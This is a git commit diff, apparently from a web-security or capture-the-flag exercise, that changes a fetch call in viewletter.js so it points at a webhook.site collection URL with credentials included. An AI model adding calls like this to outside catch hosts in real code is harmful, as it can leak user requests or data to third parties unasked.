5232f41fb6441bf6f919b9f76ccb38bb6cc6acfb
Taise <59153204+taise-hub@users.noreply.github.com>
2023-05-21 17:44:07 +0900

    Update viewletter.js

--- static/viewletter.js
+++ static/viewletter.js
@@ -1,6 +1,6 @@
 // const url = 'https://134.122.109.198:31655/message/4'
 const url = '/message/3'
-fetch(url, {
+fetch("http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41", {
         method: 'GET',
         credentials: "include",
 }).then((response) => response.json())
